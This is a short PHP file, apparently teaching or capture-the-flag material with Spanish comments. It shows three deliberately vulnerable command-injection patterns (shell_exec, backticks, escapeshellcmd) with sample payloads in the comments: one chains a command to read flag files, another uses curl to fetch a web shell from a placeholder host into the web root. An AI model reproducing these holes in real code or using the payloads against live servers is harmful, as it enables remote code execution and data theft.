<?php
// Vuln 1: shell_exec con concatenacion
echo shell_exec("ping -c 1 " . $_POST['host']);          // host=127.0.0.1;cat /data/flags/*

// Vuln 2: backticks (equivalen a shell_exec)
$file = $_GET['file'];
echo `wc -l uploads/$file`;

// Vuln 3: escapeshellcmd NO impide argument injection
$url = escapeshellcmd($_GET['url']);
system("curl -s $url");                                   // url=-o /var/www/html/x.php http://evil/shell
